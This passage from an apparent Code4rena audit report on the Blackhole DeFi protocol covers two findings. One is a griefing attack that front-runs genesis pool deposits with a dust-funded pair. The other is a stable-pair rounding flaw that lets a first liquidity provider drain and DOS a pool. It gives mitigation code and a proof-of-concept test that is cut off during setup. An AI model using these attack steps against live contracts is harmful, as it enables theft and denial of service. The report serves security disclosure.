<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">PairCreated</span><span class="mtk1">(</span><span class="mtk12">token0</span><span class="mtk1">, </span><span class="mtk12">token1</span><span class="mtk1">, </span><span class="mtk12">stable</span><span class="mtk1">, </span><span class="mtk12">pair</span><span class="mtk1">, </span><span class="mtk12">allPairs</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<ul>
<li>Vulnerable validation: In <code>GenesisPoolManager.depositNativeToken()</code>, the protocol checks whether the pair already exists. If so, it requires that both token balances in the pair are zero — but does not verify whether the pair was created by the protocol itself.</li>
</ul>
<pre data-index="28" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">depositNativeToken</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">nativeToken</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">auctionIndex</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">GenesisInfo</span><span class="mtk1"> </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">genesisPoolInfo</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">TokenAllocation</span><span class="mtk1"> </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">allocationInfo</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">nonReentrant</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">genesisPool</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">//.................code</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pairAddress</span><span class="mtk1"> = </span><span class="mtk12">pairFactory</span><span class="mtk1">.</span><span class="mtk11">getPair</span><span class="mtk1">(</span><span class="mtk12">nativeToken</span><span class="mtk1">, </span><span class="mtk12">_fundingToken</span><span class="mtk1">, </span><span class="mtk12">_stable</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">pairAddress</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">nativeToken</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pairAddress</span><span class="mtk1">) == </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk8">"!ZV"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">_fundingToken</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pairAddress</span><span class="mtk1">) == </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk8">"!ZV"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk3">//........................more code</span></span></span></code></pre>
<p><strong>Attack Scenario:</strong></p>
<p>An attacker can observe a pending <code>createGenesisPool</code> transaction (or the <code>GenesisCreated</code> event). The attacker can:</p>
<ul>
<li>Call <code>pairFactory.createPair(nativeToken</code>, <code>fundingToken</code>, <code>stable</code>) to create a new, empty LP pair for the target tokens.</li>
<li>Immediately after, transfer a minimal non-zero amount (e.g., 1 wei) of both <code>nativeToken</code> and <code>fundingToken</code> directly to this newly created pair contract address.</li>
</ul>
<h3 style="position:relative;" id="impact-4"><a class="anchor before" aria-label="impact 4 permalink" href="#impact-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>When the legitimate depo<code>sitNativeToken transaction executes,</code>pairFactory.getPair<code>will return the attacker's pair address. The require</code>(IERC20(token).balanceOf(pairAddress) == 0, “!ZV”);<code>checks will then fail because the pair now holds a non-zero balance of tokens. This causes the legitimate</code>depositNativeToken` transaction to revert, resulting in:</p>
<ul>
<li>Denial of Service (DoS): Legitimate projects are repeatedly blocked from launching their intended Genesis Pools.</li>
<li>Griefing: An attacker can perform this attack with minimal gas cost, making it a highly effective and low-cost method to disrupt the protocol’s core functionality.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-6"><a class="anchor before" aria-label="recommended mitigation steps 6 permalink" href="#recommended-mitigation-steps-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Add pair ownership or Origin validation. Instead of just checking <code>balance == 0</code>, validate that your protocol created the pair, or that the pair was expected.</p>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Unmitigated. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-40">rayss</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-17">lonelybones</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-57">maxvzuvex</a>, and also included in the <a href="#mitigation-review">Mitigation Review</a> section below.</p>
<hr>
<h2 style="position:relative;" id="m-06-first-liquidity-provider-can-dos-the-pool-of-a-stable-pair"><a class="anchor before" aria-label="m 06 first liquidity provider can dos the pool of a stable pair permalink" href="#m-06-first-liquidity-provider-can-dos-the-pool-of-a-stable-pair"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-185">[M-06] First liquidity provider can DOS the pool of a stable pair</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-187">ZZhelev</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-461">cu5t0mpeo</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L481">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L481</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L344">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L344</a></p>
<h3 style="position:relative;" id="finding-description-4"><a class="anchor before" aria-label="finding description 4 permalink" href="#finding-description-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>Rounding errors in the calculation of the invariant <code>k</code> can result in zero value for stable pools, allowing malicious actors to DOS the pool.</p>
<p>In the <code>Pair</code> contract, the invariant <code>k</code> of a stable pool is calculated as follows:</p>
<pre data-index="29" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_k</span><span class="mtk1">(</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">x</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">y</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">stable</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_x</span><span class="mtk1"> = (</span><span class="mtk12">x</span><span class="mtk1"> * </span><span class="mtk7">1e18</span><span class="mtk1">) / </span><span class="mtk12">decimals0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_y</span><span class="mtk1"> = (</span><span class="mtk12">y</span><span class="mtk1"> * </span><span class="mtk7">1e18</span><span class="mtk1">) / </span><span class="mtk12">decimals1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    @&gt;&gt;     </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_a</span><span class="mtk1"> = (</span><span class="mtk12">_x</span><span class="mtk1"> * </span><span class="mtk12">_y</span><span class="mtk1">) / </span><span class="mtk7">1e18</span><span class="mtk1">; </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_b</span><span class="mtk1"> = ((</span><span class="mtk12">_x</span><span class="mtk1"> * </span><span class="mtk12">_x</span><span class="mtk1">) / </span><span class="mtk7">1e18</span><span class="mtk1"> + (</span><span class="mtk12">_y</span><span class="mtk1"> * </span><span class="mtk12">_y</span><span class="mtk1">) / </span><span class="mtk7">1e18</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk12">_a</span><span class="mtk1"> * </span><span class="mtk12">_b</span><span class="mtk1">) / </span><span class="mtk7">1e18</span><span class="mtk1">; </span><span class="mtk3">// x3y+y3x &gt;= k</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">x</span><span class="mtk1"> * </span><span class="mtk12">y</span><span class="mtk1">; </span><span class="mtk3">// xy &gt;= k</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>The value of <code>_a = (x * y) / 1e18</code> becomes zero due to rounding errors when <code>x * y &lt; 1e18</code>. This rounding error can result in the invariant k of stable pools equaling zero, allowing a trader to steal the remaining assets in the pool. A malicious first liquidity provider can DOS the pair by:</p>
<ul>
<li>Minting a small amount of liquidity to the pool.</li>
<li>Stealing the remaining assets in the pool.</li>
<li>Repeating steps 1 and 2 until the total supply overflows.</li>
</ul>
<h3 style="position:relative;" id="impact-5"><a class="anchor before" aria-label="impact 5 permalink" href="#impact-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Pool will be DOSsed for other users to use.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-7"><a class="anchor before" aria-label="recommended mitigation steps 7 permalink" href="#recommended-mitigation-steps-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<pre data-index="30" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">function mint(address to) external lock returns (uint liquidity) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (uint _reserve0, uint _reserve1) = (reserve0, reserve1);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint _balance0 = IERC20(token0).balanceOf(address(this));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint _balance1 = IERC20(token1).balanceOf(address(this));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint _amount0 = _balance0 - _reserve0;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint _amount1 = _balance1 - _reserve1;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        if (_totalSupply == 0) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+           if (stable) { require(_k(_amount0, _amount1) &gt; MINIMUM_K; }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } else {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            liquidity = Math.min(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                (_amount0 * _totalSupply) / _reserve0,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                (_amount1 * _totalSupply) / _reserve1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(liquidity &gt; 0, "ILM"); // Pair: INSUFFICIENT_LIQUIDITY_MINTED</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        _mint(to, liquidity);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        _update(_balance0, _balance1, _reserve0, _reserve1);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        emit Mint(msg.sender, _amount0, _amount1);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<h3 style="position:relative;" id="proof-of-concept-4"><a class="anchor before" aria-label="proof of concept 4 permalink" href="#proof-of-concept-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<details>
<pre data-index="31" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">const</span><span class="mtk1"> { </span><span class="mtk12">expect</span><span class="mtk1"> } = </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk8">"chai"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">const</span><span class="mtk1"> { </span><span class="mtk12">ethers</span><span class="mtk1"> } = </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk8">"hardhat"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">describe</span><span class="mtk1">(</span><span class="mtk8">"Pair Vulnerability Test (First Liquidity Provider DOS)"</span><span class="mtk1">, </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">deployer</span><span class="mtk1">, </span><span class="mtk12">attacker</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">MockERC20</span><span class="mtk1">, </span><span class="mtk12">dai</span><span class="mtk1">, </span><span class="mtk12">frax</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">PairFactory</span><span class="mtk1">, </span><span class="mtk12">factory</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">PairGenerator</span><span class="mtk1">, </span><span class="mtk12">pairGenerator</span><span class="mtk1">; </span><span class="mtk3">// Added PairGenerator</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">Pair</span><span class="mtk1">; </span><span class="mtk3">// To interact with the Pair contract instance</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">MINT_AMOUNT</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">BigNumber</span><span class="mtk1">.</span><span class="mtk11">from</span><span class="mtk1">(</span><span class="mtk8">"10000000"</span><span class="mtk1">); </span><span class="mtk3">// 10_000_000 wei (as in PoC)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">INITIAL_TOKEN_SUPPLY_FOR_ATTACKER</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">"10000"</span><span class="mtk1">); </span><span class="mtk3">// 10,000 full tokens</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">beforeEach</span><span class="mtk1">(</span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        [</span><span class="mtk12">deployer</span><span class="mtk1">, </span><span class="mtk12">attacker</span><span class="mtk1">] = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getSigners</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy Mock ERC20 tokens</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">MockERC20Factory</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"MockERC20"</span><span class="mtk1">, </span><span class="mtk12">deployer</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">dai</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">MockERC20Factory</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span><span class="mtk8">"Dai Stablecoin"</span><span class="mtk1">, </span><span class="mtk8">"DAI"</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">dai</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">frax</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">MockERC20Factory</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span><span class="mtk8">"Frax Stablecoin"</span><span class="mtk1">, </span><span class="mtk8">"FRAX"</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">frax</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Mint tokens to attacker</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">dai</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">deployer</span><span class="mtk1">).</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">INITIAL_TOKEN_SUPPLY_FOR_ATTACKER</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">frax</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">deployer</span><span class="mtk1">).</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">INITIAL_TOKEN_SUPPLY_FOR_ATTACKER</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy PairGenerator</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">PairGeneratorFactory</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"PairGenerator"</span><span class="mtk1">, </span><span class="mtk12">deployer</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairGenerator</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">PairGeneratorFactory</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pairGenerator</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy PairFactory</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">PairFactoryFactory</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"PairFactory"</span><span class="mtk1">, </span><span class="mtk12">deployer</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">factory</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">PairFactoryFactory</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Initialize PairFactory</span></span></span>
